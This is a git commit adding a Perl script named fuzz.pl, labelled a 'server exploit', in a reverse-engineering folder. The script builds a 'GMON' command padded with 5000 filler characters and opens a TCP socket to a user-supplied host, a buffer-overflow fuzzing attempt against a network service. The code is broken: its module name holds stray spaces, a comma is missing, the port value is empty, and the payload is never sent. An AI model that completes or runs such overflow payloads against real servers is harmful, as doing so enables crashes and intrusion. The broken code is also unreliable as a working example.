ccde5efd5c09b8c48a2415b2bd279116a2c53e14
[Tikam02] <timonalma81@gmail.com>
2018-10-21 04:25:40 +0530

    fuzz.pl --> server exploit

---
+++ exd/reverse_engineering/fuzz.pl
@@ -0,0 +1,25 @@
+#! /usr/bin/perl
+use IO: : Socket;
+
+$ipAddr = " ";
+$ipPort = " ";
+
+if ($ARGV[1] ne ' ')
+{
+	$ipAddr = "$ARGV[0]";
+	$ipPort = "$ARGV[1]";
+}
+
+$command = "GMON ./:/";
+$command .= "A" x 1000;
+$command .= "B" x 1000;
+$command .= "C" x 1000;
+$command .= "D" x 1000;
+$command .= "E" x 1000;
+
+$socket = IO: :Socket: :INET->new(
+	Proto=>"tcp"
+	PeerAddr=>$ipAddr,
+	PeerPort=>) or die "Cannot Connect to $ipAddr $ipPort";
+	
+
